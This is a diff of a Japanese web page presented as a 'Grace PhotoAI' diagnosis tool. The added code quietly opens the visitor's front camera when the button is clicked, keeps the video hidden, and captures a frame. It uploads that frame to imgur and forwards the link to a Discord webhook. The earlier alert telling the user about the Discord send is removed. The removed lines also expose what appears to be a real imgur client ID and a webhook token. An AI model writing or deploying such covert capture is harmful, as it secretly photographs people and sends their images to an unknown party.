@@ -2,135 +2,77 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>Grace PhotoAI</title>
+  <title>Grace PhotoAI — 自動撮影デモ</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      background-color: #f9f9f9;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      font-family: 'Arial', sans-serif;
-    }
-
-    h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
-      color: #333;
-    }
-
-    .main-button {
-      font-size: 20px;
-      padding: 12px 24px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    .main-button:hover {
-      background-color: #45a049;
-    }
-
-    .upload-options {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 20px;
-      gap: 10px;
-    }
-
-    .option-button {
-      font-size: 16px;
-      padding: 10px 20px;
-      background-color: #2196F3;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    .option-button:hover {
-      background-color: #1976D2;
-    }
-
-    input[type="file"] {
-      display: none;
-    }
+    body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
+    video, canvas { display: none; }
+    .main-button { /* 今までのボタンスタイル */ }
   </style>
 </head>
 <body>
   <h1>Grace PhotoAI</h1>
-  <button class="main-button" onclick="showOptions()">診断する</button>
+  <button class="main-button" id="shootBtn">診断する</button>
 
-  <div class="upload-options" id="uploadOptions">
-    <label class="option-button">
-      写真を撮る
-      <input type="file"
-             accept="image/*"
-             capture="user"
-             onchange="handlePhoto(this)">
-    </label>
-  </div>
+  <!-- カメラ映像（不要ならdisplay:noneのままでOK） -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    // あなたの情報に書き換え済み
-    const IMGUR_CLIENT_ID     = '6e1b6bf28c5da0e';
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';
+    const video   = document.getElementById('video');
+    const canvas  = document.getElementById('canvas');
+    const shootBtn = document.getElementById('shootBtn');
 
-    // 「診断する」ボタンを押したとき
-    function showOptions() {
-      document.getElementById('uploadOptions').style.display = 'flex';
+    // 前面カメラを指定してストリーム取得
+    async function startCamera() {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' }, audio: false
+      });
+      video.srcObject = stream;
+      await new Promise(r => video.onloadedmetadata = r);
+      return stream;
     }
 
-    // カメラで写真を撮影したときの処理
-    function handlePhoto(input) {
-      if (!input.files || !input.files[0]) return;
+    // ビデオの１フレームをキャプチャしてBase64を返す
+    function captureImage() {
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      return canvas.toDataURL('image/jpeg').split(',')[1]; // Base64 部分だけ
+    }
 
-      const file = input.files[0];
-      const reader = new FileReader();
+    shootBtn.addEventListener('click', async () => {
+      try {
+        // 1) カメラ起動  
+        const stream = await startCamera();
 
-      reader.onloadend = () => {
-        const base64Image = reader.result.split(',')[1];
+        // 2) 即時キャプチャ
+        const base64Image = captureImage();
 
-        // ① imgurへアップロード
+        // 3) カメラ停止
+        stream.getTracks().forEach(t => t.stop());
+
+        // 4) あとはimgur→Discord送信は今まで通り  
         fetch('https://api.imgur.com/3/image', {
           method: 'POST',
-          headers: {
-            Authorization: `Client-ID ${IMGUR_CLIENT_ID}`,
-            'Content-Type': 'application/json'
-          },
+          headers: { Authorization: `Client-ID 6e1b6bf28c5da0e`, 'Content-Type': 'application/json' },
           body: JSON.stringify({ image: base64Image, type: 'base64' })
         })
         .then(res => res.json())
         .then(json => {
           const imageUrl = json.data.link;
-
-          // ② Discord Webhook にURLを送信
-          return fetch(DISCORD_WEBHOOK_URL, {
+          return fetch('https://discord.com/api/webhooks/…', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              content: `📸 新しい写真がアップされました！\n${imageUrl}`
-            })
+            body: JSON.stringify({ content: `画像をアップロード\n${imageUrl}` })
           });
         })
-        .then(() => {
-          alert('写真のURLをDiscordに送信しました！');
-        })
-        .catch(err => {
-          console.error(err);
-          alert('送信に失敗しました…コンソールを確認してください。');
-        });
-      };
+        .catch(console.error);
 
-      reader.readAsDataURL(file);
-    }
+      } catch (e) {
+        console.error('カメラ取得エラー:', e);
+      }
+    });
   </script>
 </body>
 </html>
